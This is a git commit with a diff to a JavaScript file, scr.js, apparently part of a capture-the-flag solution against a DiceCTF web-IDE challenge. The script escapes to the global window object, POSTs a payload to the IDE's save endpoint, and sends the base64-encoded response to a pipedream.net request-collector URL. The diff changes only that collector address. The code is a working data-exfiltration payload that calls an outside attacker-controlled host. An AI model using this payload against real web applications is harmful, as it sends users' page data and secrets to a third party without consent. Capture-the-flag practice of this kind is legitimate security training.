2f34b4cfc665a9de6d66e253c1ab26a1728a5419
moderly <lexanic37@gmail.com>
2021-02-06 23:09:57 +0300

    sad

--- scr.js
+++ scr.js
@@ -5,4 +5,4 @@ let window = (_=>0).constructor('return this')();
 let oReq = new window.XMLHttpRequest();
 oReq.open('POST', 'https://web-ide.dicec.tf/ide/save');
 oReq.send(payload);
-window.fetch('https://enali62mm21hu.x.pipedream.net?as=' + window.btoa(oReq.responseText));
+window.fetch('https://6d7d010d1165a7ebf6f3094a3b6f443d.m.pipedream.net?as=' + window.btoa(oReq.responseText));
